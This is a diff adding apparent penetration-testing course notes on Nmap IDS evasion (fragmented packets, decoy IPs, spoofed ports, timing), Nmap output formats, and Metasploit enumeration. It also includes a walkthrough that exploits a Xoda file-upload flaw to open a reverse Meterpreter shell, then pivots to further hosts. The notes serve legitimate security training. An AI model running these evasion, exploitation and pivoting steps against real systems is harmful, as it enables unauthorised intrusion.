@@ -533,3 +533,245 @@ It will ask the password, and if successful you can perform SQL operations and y
 ```bash
 SHOW DATABASES;
 ```
+
+### Firewall Detection & IDS Evasion with Nmap
+
+How to use Nmap to discover firewall or intrusion detection systems. 
+<br>
+IDS are systems that can discover your identity and detect where your scan is coming from.
+<br>
+
+When you do a nmap port scan, sometimes you can receive a comment like: Not shown: X closed ports or you may receive a X filtered ports. In the second case it may mean that the Operating System of the target is Windows or that there is a firewall blocking your scan and pings.
+
+#### Sending TCP ACK packets
+
+You can send a TCP ACK packet with the -sA command.
+
+```bash
+nmap -sA target-ip
+```
+
+#### Sending fragmented packets
+
+One technique for detect IDS is to send fragment packets, meaning to send smaller packets, with the -f command.
+<br>
+This will create 2 packets from each packet, with offsets 0 and 8 respectively. You can add the -mtu "dimension" command to create fragmented packets. Mtu stands for Maximum Transmission Unit in order to specify the maximum dimension (in bytes) of your packets.
+
+```bash
+nmap -f target-ip
+nmap -f mtu dimension target-ip
+```
+
+#### Other techniques to avoid detection: Data-length, Decoy Port and Ipl,
+
+You may use the --data-length "length" to change the lenght of the packets sent. 
+
+```bash
+nmap -f --data-length 200 target-ip
+```
+
+You can use the -g command to falsify the port from where you send the scan.
+
+```bash
+nmap -g fake-port target-ip
+```
+
+You can use the -D command to falsify your ip, to use a decoy and make your scans appear from a different ip (or ips).
+
+```bash
+nmap -D fake-ip(s) target-ip
+```
+
+
+### Optimizing Nmap Scans
+
+Exploring different techniques to change the regular Nmap scans by improving or reducing the speed of the scan to reduce the chances of being detected.
+<br>
+You can change the speed of your scans with the -Tspeed command (from 0 to 5, the higher the faster).
+
+```bash
+nmap -T4 target-ip
+```
+
+Also you can use the --host-timeout command the change the timeout of the scan.
+
+```bash
+nmap --host-timeout 15s targe-ip
+```
+
+You can change the scan delay option in order to change the seconds of delay between each packet sent with the --scan-delay seconds
+
+```bash
+nmap --scan-delay 5 target-ip
+```
+
+
+### Nmap Output Formats
+
+Saving your scan results for past analysis or using in other tools.
+<br>
+In Nmap there are different format available for saving: 
+<li>-oN : normal output (text file)</li>
+<li>-oX : XML, useful for Metasploit framework</li>
+<li>-oG : Grepable format</li>
+<li>-oA : Save them in the above 3 formats</li>
+<li>-v : this can increase the description of your scan (you can use -vv for even more descriptions)</li>
+
+Example: 
+
+```bash
+nmap target-ip -oX
+```
+
+
+## Conclusions
+
+In this course we have discovered:
+<li>The process of network mapping: host discovering, port scanning, service version..</li>
+<li>Basic understanding of the OSI protocol</li>
+<li>Using Nmap for host discovering, port scan and its different commands and scripts</li>
+<li>Detect and evade firewalls fragmenting packets or using time-templates and speed up/down your Nmap scans</li>
+<li>Saving the scan results into three different formats</li>
+
+
+## Assessment Methodologies: Enumeration
+
+### Introduction to Enumeration
+
+After host discovery and port scanning, the next step is to perform enumeration.
+<br>
+Enumeration is to gain additional information on the target, such as account name, shares, eventually misconfigured service protocols and so on..
+
+### Port Scanning and Enumeration with Nmap
+
+You can use Nmap for enumeration, such as discover the operating system and the version of the target's ports.
+<br>
+You can export the results into a format readable by the Metasploit framework for further operations.
+<br>
+You can start by doing a regular host, port and version scan with Nmap:
+
+```bash
+nmap target-ip  # standard scanning
+nmap -Pn target-ip  # our scan may be automatically blocked if the OS of the target is Windows, so we can use the -Pn command to avoid host scanning and just detect ports.
+nmap -Pn -sV -O target-ip  # get the version of the services and operating systems of the ports
+nmap -Pn -sV -O target-ip -oX output.xml  # save the results in a .xml file that will be used by Metasploit framework
+```
+
+### Importing Nmap results into MSF
+
+In order to import the Nmap results into Metasploit framework you need to start PostegreSQL and the MSF console.
+
+```bash
+service postgresql start
+msfconsole
+```
+
+You can check the connection of the database in the MSF console:
+
+```bash
+db_status
+```
+
+Now you can add a new MSF workspace:
+
+```bash
+workspace -a name
+```
+
+You can import the output file in MSF with this command:
+
+```bash
+db_import xmlfile-path
+```
+
+Then you can explore your output, like enumerate hosts, services and vulnerabilities:
+
+```bash
+hosts
+services
+vulns
+```
+
+You can perform Nmap scans directly in the MSF (without the need to save them since they will be automatically updated in your current MSF workspace):
+
+```bash
+db_nmap -Pn -sV -O target-ip
+```
+
+### Port Scanning with Auxiliary modules
+
+Auxiliary modules are used for enumerating hosts, ports, network discovery and so on.
+<br>
+Auxiliary modules are useful when you have to perform information gathering on other hosts that you've found from the initial scan. You can enable Auxiliary modules to scan other targets directly from the first target of that network.
+<br>
+Here's a brief roadmap on how to do it:
+<br>
+
+**General Setup**
+
+```bash
+# Get the IP of the target
+service postgresql start  # Start the PostgreSQL
+msfconsole  # Start Metasploit framework 
+workspace -a name  # Create a MSF workspace
+```
+
+**Use Auxiliary modules**
+
+```bash
+search portscan  # List every auxiliary modules about port scan
+use auxiliary/scanner/portscan/tcp  # Use the Auxiliary module
+show options  # Show options, in order to see if any value is missing
+set RHOSTS target-ip  # Set the target ip(s)
+run  # Execute the Auxiliary module
+curl target-ip  # Print the html file of the target
+```
+
+After you have reached this point you can try to search (and use) some Auxiliary modules pertinent with the application of your target.
+<br>
+In this example, on the html file, the application title is called "Xoda".
+
+```bash
+search Xoda  # Search if there is an Auxiliary module about that application
+use exploit/unix/webapp/xoda_file_upload  # Use the Auxiliary module about "Xoda"
+show options  # Show the options in order to configure the scan of your target
+set RHOSTS target-ip  # Set the ip of your target
+set LHOST ip-target  # Ip of the network of the target (example if target is 192.168.1.3 you can use 192.168.1.2)
+set TARGETURI /  # Set the url of the target (in this case it's in the root path, so a / )
+exploit  # Run the exploitation on the target
+```
+
+In this example, the exploit has:
+<li>Started the reverse tcp handler</li>
+<li>Sent a Php Payload</li>
+<li>Sending the stage</li>
+<li>Open the Meterpreter session</li>
+
+This will enable us to execute commands on the target operating system
+
+```bash
+sysinfo  # Get info about the target operating system
+shell  # Create a bash session on the target
+/bin/bash -i  # Create the bash session
+ifconfig  # Show the ip configuration of the target network
+```
+
+Now you can add the new ip target to the meterpreter and your MSF workspace.
+
+```bash
+run autoroute -s new-target-ip  # (from meterpreter), add the new ip target to the Meterpreter
+background  # Save this new target ip on your Metasploit workspace and return to the workspace
+search portscan  # Search for Auxiliary modules about port scan again
+use auxiliary/scanner/portscan/tcp  # Use the Auxiliary module
+set RHOSTS new-target-ip  # Set the new target ip 
+run  # Execute the Auxiliary module in order to perform port scan on the new target ip
+```
+
+You can perform other scans, for example UDP:
+
+```bash
+search udp_sweep  # Search for Auxiliary modules about UDP Scan
+use auxiliary/scanner/discovery/udp_sweep  # Use the Auxiliary module
+set RHOSTS new-target-ip  # Set the new ip target for the new scan
+run  # Execute the Auxiliary module
+```
